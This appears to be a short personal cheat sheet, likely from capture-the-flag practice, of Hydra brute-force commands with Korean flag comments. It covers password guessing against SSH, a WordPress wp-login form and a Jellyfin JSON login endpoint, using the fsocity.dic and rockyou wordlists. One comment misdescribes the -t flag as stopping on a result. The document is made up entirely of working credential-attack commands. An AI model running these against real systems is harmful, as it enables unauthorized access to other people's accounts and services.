
```bash title="SSH"
hydra -l friend_ -P fsocity.dic -t 32 $target ssh
```

```bash title="Web (POST)"
# -L : id 사전파일
# -l : id 고정
# -P : pw 사전파일
# -p : pw 고정
# -t : 결과나오면 멈춤
# -s : 포트
hydra -l admin -P fsocity.dic $target http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.201.41.6%2Fwp-admin%2F&testcookie=1:Invalid username" -t 32 -f -V
```

```bash title="JSON"
hydra -l jellyfin -P /usr/share/wordlists/rockyou.txt $target -s 8096 http-post-form '/Users/authenticatebyname:{"Username"\:^USER^,"Pw"\:^PASS^}:Error' -t 32 -f -V
```

